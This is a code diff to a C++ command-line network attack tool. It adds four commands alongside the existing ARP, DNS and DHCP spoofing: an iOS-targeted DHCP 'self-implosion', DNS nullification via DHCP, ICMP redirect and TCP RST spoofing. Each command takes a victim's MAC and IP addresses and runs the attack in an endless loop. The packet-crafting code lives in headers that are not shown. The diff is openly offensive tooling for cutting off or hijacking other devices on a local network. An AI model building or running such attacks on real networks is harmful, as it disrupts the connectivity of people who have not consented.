@@ -11,6 +11,9 @@
 #include "arp_operations.h"
 #include "dns_handler.h"
 #include "dhcp_spoofing.h"
+#include "ios_dhcp_void.h"
+#include "icmp_redirect.h"
+#include "tcp_rst_spoof.h"
 
 void print_usage(const char* prog) {
     std::cerr << "Usage: " << prog << " <command> [args...]" << std::endl;
@@ -22,6 +25,10 @@ void print_usage(const char* prog) {
     std::cerr << "  block_traffic_control <interface> <target_ip> [rate_kbps]  Block via tc rate limit (0=block, >0=rate limit)" << std::endl;
     std::cerr << "  dns_spoof <interface> <domain> <spoofed_ip> [upstream_dns]    DNS spoofing" << std::endl;
     std::cerr << "  dhcp_spoof <interface> <target_mac> <spoofed_ip> <gateway_ip> [dns_server]    DHCP spoofing" << std::endl;
+  std::cerr << "  ios_dhcp_void <interface> <target_mac> <router_ip> <router_mac> [client_ip]    iOS DHCP self-implosion" << std::endl;
+  std::cerr << "  ios_dhcp_nullify_dns <interface> <target_mac> <router_ip> <router_mac> [client_ip]    iOS DNS nullification via DHCP" << std::endl;
+  std::cerr << "  icmp_redirect <interface> <target_mac> <target_ip> <router_ip> <router_mac> [all|specific_dst]    ICMP redirect void" << std::endl;
+  std::cerr << "  tcp_rst <interface> <target_mac> <target_ip>    TCP RST asymmetry attack" << std::endl;
 }
 
 int main(int argc, char* argv[]) {
@@ -392,6 +399,155 @@ int main(int argc, char* argv[]) {
         }
 
         close(sockfd);
+    }
+    else if (command == "ios_dhcp_void") {
+        if (argc < 6) {
+            print_usage(argv[0]);
+            return 1;
+        }
+        const char* iface = argv[2];
+        const char* target_mac = argv[3];
+        const char* router_ip = argv[4];
+        const char* router_mac = argv[5];
+        const char* client_ip = (argc > 6) ? argv[6] : "";
+
+        std::cout << "DEBUG: Starting iOS DHCP void against " << target_mac << " via router " << router_ip << std::endl;
+
+        IOSDHCPVoidRule rule;
+        rule.target_mac = std::string(target_mac);
+        rule.target_ip = std::string(client_ip);
+        rule.router_ip = std::string(router_ip);
+        rule.router_mac = std::string(router_mac);
+        rule.interface_name = std::string(iface);
+        rule.nullify_dns = false;
+
+        ios_dhcp_void_init();
+        if (!ios_dhcp_void_start(rule)) {
+            std::cerr << "ERROR: Failed to start iOS DHCP void" << std::endl;
+            return 1;
+        }
+
+        std::cout << "IOS_DHCP_VOID_STARTED: " << target_mac << std::endl;
+        fflush(stdout);
+
+        int counter = 0;
+        while (true) {
+            counter++;
+            std::cout << "IOS_DHCP_VOID_STATUS: Active - monitoring for DHCP requests (iteration " << counter << ")" << std::endl;
+            fflush(stdout);
+            sleep(5);
+        }
+    }
+    else if (command == "ios_dhcp_nullify_dns") {
+        if (argc < 6) {
+            print_usage(argv[0]);
+            return 1;
+        }
+        const char* iface = argv[2];
+        const char* target_mac = argv[3];
+        const char* router_ip = argv[4];
+        const char* router_mac = argv[5];
+        const char* client_ip = (argc > 6) ? argv[6] : "";
+
+        std::cout << "DEBUG: Starting iOS DNS nullification against " << target_mac << std::endl;
+
+        IOSDHCPVoidRule rule;
+        rule.target_mac = std::string(target_mac);
+        rule.target_ip = std::string(client_ip);
+        rule.router_ip = std::string(router_ip);
+        rule.router_mac = std::string(router_mac);
+        rule.interface_name = std::string(iface);
+        rule.nullify_dns = true;
+
+        ios_dhcp_void_init();
+        if (!ios_dhcp_nullify_dns_start(rule)) {
+            std::cerr << "ERROR: Failed to start iOS DNS nullification" << std::endl;
+            return 1;
+        }
+
+        std::cout << "IOS_DNS_NULLIFY_STARTED: " << target_mac << std::endl;
+        fflush(stdout);
+
+        int counter = 0;
+        while (true) {
+            counter++;
+            std::cout << "IOS_DNS_NULLIFY_STATUS: Active (iteration " << counter << ")" << std::endl;
+            fflush(stdout);
+            sleep(5);
+        }
+    }
+    else if (command == "icmp_redirect") {
+        if (argc < 7) {
+            print_usage(argv[0]);
+            return 1;
+        }
+        const char* iface = argv[2];
+        const char* target_mac = argv[3];
+        const char* target_ip = argv[4];
+        const char* router_ip = argv[5];
+        const char* router_mac = argv[6];
+        const char* scope = (argc > 7) ? argv[7] : "all";
+
+        std::cout << "DEBUG: Starting ICMP redirect against " << target_ip << " scope=" << scope << std::endl;
+
+        ICMPRedirectTarget target;
+        target.client_mac = std::string(target_mac);
+        target.client_ip = std::string(target_ip);
+        target.router_ip = std::string(router_ip);
+        target.router_mac = std::string(router_mac);
+        target.interface_name = std::string(iface);
+        target.redirect_all = (strcmp(scope, "all") == 0);
+        target.target_dst = target.redirect_all ? "" : std::string(scope);
+
+        icmp_redirect_init();
+        if (!icmp_redirect_start(target)) {
+            std::cerr << "ERROR: Failed to start ICMP redirect" << std::endl;
+            return 1;
+        }
+
+        std::cout << "ICMP_REDIRECT_STARTED: " << target_ip << std::endl;
+        fflush(stdout);
+
+        int counter = 0;
+        while (true) {
+            counter++;
+            std::cout << "ICMP_REDIRECT_STATUS: Active (iteration " << counter << ")" << std::endl;
+            fflush(stdout);
+            sleep(5);
+        }
+    }
+    else if (command == "tcp_rst") {
+        if (argc < 5) {
+            print_usage(argv[0]);
+            return 1;
+        }
+        const char* iface = argv[2];
+        const char* target_mac = argv[3];
+        const char* target_ip = argv[4];
+
+        std::cout << "DEBUG: Starting TCP RST attack against " << target_ip << " (" << target_mac << ")" << std::endl;
+
+        TCPRSTTarget target;
+        target.client_mac = std::string(target_mac);
+        target.client_ip = std::string(target_ip);
+        target.interface_name = std::string(iface);
+
+        tcp_rst_init();
+        if (!tcp_rst_start(target)) {
+            std::cerr << "ERROR: Failed to start TCP RST attack" << std::endl;
+            return 1;
+        }
+
+        std::cout << "TCP_RST_STARTED: " << target_ip << std::endl;
+        fflush(stdout);
+
+        int counter = 0;
+        while (true) {
+            counter++;
+            std::cout << "TCP_RST_STATUS: Active - sniffing SYNs (iteration " << counter << ")" << std::endl;
+            fflush(stdout);
+            sleep(5);
+        }
     }
     else {
         std::cerr << "Unknown command: " << command << std::endl;
